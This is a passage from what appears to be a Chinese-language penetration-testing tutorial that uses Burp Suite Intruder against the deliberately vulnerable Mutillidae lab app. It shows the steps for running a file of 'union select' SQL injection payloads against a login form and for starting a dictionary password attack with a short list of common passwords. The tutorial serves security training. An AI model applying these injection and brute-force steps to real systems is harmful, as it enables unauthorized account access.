  \ 捕获登录请求：\n   ![](img/image00843.jpeg)\n\n3. 现在，在拦截的文本任意地方点击右键并选择 `Send to Intruder`：\n\
  \   ![](img/image00844.jpeg)\n\n4. 注意到 `Intruder` 菜单标签变亮了，点击它。\n\n5. 现在点击 `Positions`\
  \ 标签：\n   ![](img/image00845.jpeg)\n   注意有几部分数据被高亮显示。此时，我们只想关注管理员的密码，因此我们需要清除所有选中的点，然后选择我们自己的。\n\
  \n6. 在右侧菜单上，点击 `clear`，这将擦除所有标记点。\n\n7. 现在只需高亮 `username` 字段中的值 `test`：\n   ![](img/image00846.jpeg)\n\
  \n8. 点击右侧菜单上的 `add`\n9. Burp suite 现在将高亮密码字段中的单词 `test`。现在我们已经设置了想要攻击的字段，我们需要设置负载（payload）。\n\
  \n10. 点击 `payloads` 标签\n11. 从 `Payload Type` 下拉框中选择 `Runtime file`。\n12. 选择我们的 `union.txt`\
  \ 文件：\n    ![](img/image00847.jpeg)\n\n13. 现在在最顶部的 `Intruder` 菜单中，点击 `Start Attack`：\n\
  \    ![](img/image00848.jpeg)\n\n   会弹出一个警告框，说明 Burp 免费版本的 `Intruder` 功能有时间限制。攻击将会运行，只是会比使用该程序的付费版本要慢得多。\n\
  \n   Burp 将将处理文本文件中的每一个 `union select` 语句并将其插入用户名字段中。它将把每个独立的响应记录为一个请求号。\n\n   -\
  \ 当自动化攻击完成后，点击其中一条 `union select` 行\n   - 点击底部窗口中的 `response` 标签\n   - 然后点击 `render`\
  \ 标签：\n     ![](img/image00849.jpeg)\n\n   当你运行到列数正确的那个时，你将在上方看到正确的用户名、密码和签名屏幕。\n\
  \n## Intruder 字典列表攻击\n\n让我们看看是否可以通过让 `Intruder` 使用字典列表对密码来获取管理员账户的访问。基本上，我们为 Burp\
  \ 提供一个可能的密码列表，Burp 尝试使用每个密码进行登录，然后记录结果。Burp 免费版本的 `Intruder` 功能有时间限制，这意味着它会大大减慢自动化攻击（大约每秒一次攻击），对于大型字典列表，这可能花费大量时间。因此，我们不使用\
  \ Kali 自带的字典列表之一，而是自己创建一个短字典列表来使用。\n\n使用你喜爱的文本编辑器创建一个名为 `mutillidae.txt` 的文件并保存到桌面。输入以下密码：\n\
  - `12345`\n- `password`\n- `qwerty`\n- `admin`\n- `pass`\n- `word`\n\n现在我们的列表完成了，让我们用它来攻击：\n\
